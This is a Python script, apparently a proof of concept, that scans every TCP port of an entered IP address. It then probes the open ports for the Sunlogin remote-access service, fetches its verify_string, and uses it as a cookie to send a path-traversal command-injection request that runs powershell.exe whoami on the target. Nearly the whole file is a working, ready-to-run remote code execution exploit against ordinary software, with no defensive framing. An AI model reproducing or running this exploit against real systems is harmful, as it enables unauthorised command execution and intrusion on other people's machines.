# -*- coding: utf-8 -*-
# @Time    : 2022/2/16 21:03
# @Author  : AD钙奶
import json
import socket
from datetime import datetime
from multiprocessing.dummy import Pool as ThreadPool
import requests

port_list = []

class ScanPort:
	def __init__(self,ip):
		self._ip = ip
		self.ip = None

	def scan_port(self, port):
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			res = s.connect_ex((self.ip, port))
			if res == 0:
				print('Ip:{} Port:{} IS OPEN'.format(self.ip, port))
				port_list.append(port)
		except Exception as e:
			print(e)
		finally:
			s.close()

	def start(self):
		remote_server = self._ip
		self.ip = socket.gethostbyname(remote_server)
		ports = [i for i in range(1, 65535)]
		socket.setdefaulttimeout(0.5)
		t1 = datetime.now()
		threads = []
		pool = ThreadPool(processes=1000)
		pool.map(self.scan_port, ports)
		pool.close()
		pool.join()
		print('[ * ] 端口扫描已完成，耗时：', datetime.now() - t1)



def _POC(ip):
	for ports in port_list:
		url = "http://" + ip + ":" + str(ports) + "/cgi-bin/rpc?action=verify-haras"
		try:
			req = requests.get(url,verify=False,timeout=1).text
			if "verify_string" in req:
				ips = ip + ":" + str(ports)
				print("[ * ] 发现向日葵端口: " + ips)
				_Rce(ips)
				exit(1)
		except Exception as e:
			pass


def _Rce(urls):
	try:
		headers = {
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"Accept-Encoding": "gzip, deflate",
			"Accept-Language": "zh-CN,zh;q=0.9"
		}
		url = 'http://' + urls + '/cgi-bin/rpc?action=verify-haras'
		req = requests.get(url, headers=headers,verify=False)
		if req.status_code == 200:
			verify_string = json.loads(req.text)['verify_string']
			headers2 = {
				"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
				"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"Accept-Encoding": "gzip, deflate",
				"Accept-Language": "zh-CN,zh;q=0.9",
				"Cookie": "CID ="  + verify_string
			}
			poc2 = 'http://' + urls + '/check?cmd=ping../../../windows/system32/windowspowershell/v1.0/powershell.exe+whoami'
			rec2 = requests.get(poc2, headers=headers2, verify=False)
			if rec2.status_code == 200:
				print('[ * ] 存在漏洞 ' + urls + '------' + rec2.text)
	except Exception as e:
		print(e)
		pass


def main():
	ip = input("[ * ] 请输入需要扫描的IP地址：")
	print('[ * ] 正在进行端口扫描')
	ScanPort(ip).start()
	_POC(ip)


if __name__ == '__main__':
	main()
